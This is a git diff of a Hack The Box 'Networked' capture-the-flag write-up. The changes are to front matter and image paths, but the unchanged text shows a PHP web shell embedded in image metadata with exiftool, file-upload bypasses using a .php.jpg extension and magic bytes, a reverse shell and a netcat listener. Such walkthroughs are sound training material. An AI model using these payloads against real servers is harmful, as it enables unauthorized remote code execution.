@@ -1,17 +1,16 @@
 ---
 layout: writeup
-title: Networked
-description: HTB writeup
-logo: /assets/img/writeups/networked_logo.png
 show-avatar: false
-permalink: /writeups/networked.html
+redirect_from: /walkthroughs/networked.html
+title: Networked
+logo: /assets/img/writeups/htb/boxes/networked/networked_logo.png
+platform: HTB
+category: Boxes
 OS: Linux
 difficulty: Easy
 release: 24 Aug 2019
 creator: <a href="https://www.hackthebox.eu/home/users/profile/8292">guly</a>
-cleared: 1 Nov 2019
 published: 2019 11 01
-redirect_from: /walkthroughs/networked.html
 ---
 
 <h2 align="center">Enumeration</h2>
@@ -73,12 +72,12 @@ with the appropriate wordlist yielded the following results
 
 If we navigate to /backup we see
 
-![backup](/assets/img/writeups/networked_backup_page.png)
+![backup](/assets/img/writeups/htb/boxes/networked/networked_backup_page.png)
 
 Downloading and extracting the tar file we find its the source files for the .php pages we found. 
 
 
-![Source](/assets/img/writeups/networked_source_files.png)
+![Source](/assets/img/writeups/htb/boxes/networked/networked_source_files.png)
 
 Analyzing the upload.php and lib.php files we see that there is some extension checking in place, as well as a mimetype check. These are in place to attempt to only allow us to upload an image file. There are two ways I found to bypass this.
 
@@ -97,7 +96,7 @@ exiftool -DocumentName="<?php if(isset(\$_REQUEST['cmd'])){echo '<pre>';\$cmd = 
 
 then we rename the image file to hilbert.php.jpg and upload it and navigate to the image and check if we have code execution
 
-![RCE](/assets/img/writeups/networked_exifdata_torce.png)
+![RCE](/assets/img/writeups/htb/boxes/networked/networked_exifdata_torce.png)
 
 Bingo! We can now use wget to download a shell file to the server and then navigate to it to get a reverse shell.
 
@@ -105,11 +104,11 @@ Bingo! We can now use wget to download a shell file to the server and then navig
 
 This method is much easier. We simply take our favorite php reverse shell (I'm using one from pentestmonkey) and append 'magicbytes' to the start of the file. This makes the mimetype check php is using think it is an image file. 
 
-![magicbytes](/assets/img/writeups/networked_magicbytes.png)
+![magicbytes](/assets/img/writeups/htb/boxes/networked/networked_magicbytes.png)
 
 Again we rename the file with the extension .php.jpg and upload it. Then set up a netcat listener on whatever port you edited into the reverse shell, and navigate to the image file
 
-![reverseurl](/assets/img/writeups/networked_reverse_url.png)
+![reverseurl](/assets/img/writeups/htb/boxes/networked/networked_reverse_url.png)
 
 ```sh
 root@kali:~/HTB/Boxes/Networked# nc -nlvp 1234
